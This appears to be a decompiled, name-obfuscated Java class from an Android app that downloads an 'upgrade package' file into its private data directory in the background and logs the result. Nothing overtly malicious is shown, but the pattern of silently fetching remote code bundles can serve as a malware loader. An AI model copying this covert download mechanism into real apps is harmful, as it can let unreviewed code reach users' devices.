package com.network.h;

import android.content.Context;
import com.network.android.c.a.a;
import com.network.android.c.a.b;
import com.network.android.j;
import com.network.media.CoreReceiver;

/* access modifiers changed from: package-private */
public final class k implements Runnable {
    k() {
    }

    public final void run() {
        try {
            if (!(j.c) && j.a()) {
                if (!j.a(j.f, true, false)) {
                    a.b("downloadUpgradePackage not allowed to download data. canSend is false");
                    return;
                }
                a.a("downloadUpgradePackage downloading package. downloadCounter: " + j.f151a);
                boolean a2 = b.a(j.d, "uglmt.dat", "/data/data/com.network.android/upgrade/");
                a.a("downloadUpgradePackage download package result: " + a2);
                if (a2) {
                    boolean unused = j.c = true;
                    Context context = j.f;
                    String str = CoreReceiver.c;
                    j.a(context);
                    b.a(1, 87, "LOG_UPGRADE_BUNDLE_DOWNLOAD_SUCCEEDED");
                    if (!j.b(j.f)) {
                        j.a(false, j.f, true, false);
                        return;
                    }
                    return;
                }
                b.a(1, 86, "LOG_UPGRADE_BUNDLE_DOWNLOAD_FAILED");
            }
        } catch (Throwable th) {
            a.a("downloadUpgradePackage exception: " + th.getMessage(), th);
            j.a(false, j.f, true, true);
        }
    }
}
